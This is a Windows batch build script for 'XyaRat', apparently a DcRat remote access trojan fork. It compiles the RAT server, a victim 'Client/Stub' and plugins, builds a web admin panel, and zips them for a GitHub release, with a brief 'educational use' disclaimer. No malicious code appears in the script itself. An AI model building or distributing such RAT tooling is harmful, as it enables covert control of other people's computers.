@echo off
REM XyaRat Build Script for Windows
REM Requires: Visual Studio 2019+, .NET SDK 9.0, Node.js 20+

echo ========================================
echo    XyaRat Build Script
echo ========================================

echo.
echo [1/7] Checking prerequisites...

where msbuild >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: MSBuild not found. Install Visual Studio 2019+
    exit /b 1
)

where dotnet >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: .NET SDK not found. Install .NET 9.0
    exit /b 1
)

where node >nul 2>&1
if %errorlevel% neq 0 (
    echo ERROR: Node.js not found. Install Node.js 20+
    exit /b 1
)

echo OK: All prerequisites installed

echo.
echo [2/7] Restoring NuGet packages...
nuget restore DcRat.sln
if %errorlevel% neq 0 (
    echo ERROR: NuGet restore failed
    exit /b 1
)
echo OK: NuGet packages restored

echo.
echo [3/7] Building RAT Solution (Server + Client + Plugins)...
msbuild /nologo /v:minimal /p:Configuration=Release DcRat.sln
if %errorlevel% neq 0 (
    echo ERROR: RAT build failed
    exit /b 1
)
echo OK: RAT Solution built successfully

echo.
echo [4/7] Building WebPanel Backend...
dotnet publish WebPanel\WebPanel.csproj -c Release -o WebPanel\bin\Release\publish
if %errorlevel% neq 0 (
    echo ERROR: WebPanel backend build failed
    exit /b 1
)
echo OK: WebPanel backend built successfully

echo.
echo [5/7] Building WebPanel Frontend (React)...
cd WebPanel\ClientApp
call npm install
if %errorlevel% neq 0 (
    echo ERROR: npm install failed
    exit /b 1
)
call npm run build
if %errorlevel% neq 0 (
    echo ERROR: Frontend build failed
    exit /b 1
)
cd ..\..
echo OK: WebPanel frontend built successfully

echo.
echo [6/7] Packaging DcRat...
powershell -Command "Compress-Archive -Path 'Binaries\Release\*' -DestinationPath 'DcRat.zip' -Force"
if %errorlevel% neq 0 (
    echo ERROR: Failed to package DcRat
    exit /b 1
)
echo OK: DcRat packaged: DcRat.zip

echo.
echo [7/7] Packaging WebPanel...
powershell -Command "Compress-Archive -Path 'WebPanel\bin\Release\publish\*' -DestinationPath 'WebPanel.zip' -Force"
if %errorlevel% neq 0 (
    echo ERROR: Failed to package WebPanel
    exit /b 1
)
echo OK: WebPanel packaged: WebPanel.zip

echo.
echo ========================================
echo Build completed successfully!
echo ========================================
echo.
echo Build Output:
echo   - Binaries\Release\       : Compiled executables
echo   - DcRat.zip               : RAT package
echo   - WebPanel.zip            : Web Admin Panel
echo.
echo Executables:
echo   - Binaries\Release\DcRat.exe          : Main RAT Server
echo   - Binaries\Release\Stub\Client.exe    : RAT Client/Stub
echo   - WebPanel\bin\Release\publish\WebPanel.exe : Web Panel
echo.
echo Next Steps:
echo   1. Test executables
echo   2. Upload to GitHub Release
echo   3. Review security settings before deployment
echo.
echo WARNING: For educational and authorized testing only!
echo.

pause
